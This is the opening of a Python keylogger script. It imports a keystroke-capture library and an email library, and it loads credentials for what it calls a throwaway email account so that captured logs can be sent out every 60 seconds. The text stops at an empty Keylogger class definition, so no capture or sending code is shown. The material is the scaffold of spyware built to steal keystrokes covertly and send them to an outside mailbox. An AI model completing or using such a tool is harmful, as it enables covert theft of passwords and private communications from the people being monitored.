import keyboard # keylogging
import smtplib # sending emails
# sending logs per period of time
from threading import Timer
from datetime import datetime

# includes email address and pw of my throwaway account
import config

# global parameters
REPORT_INTERVAL = 60
EMAIL_ADDRESS = config.EMAIL_ADDRESS
EMAIL_PW = config.EMAIL_PW

class Keylogger:
    

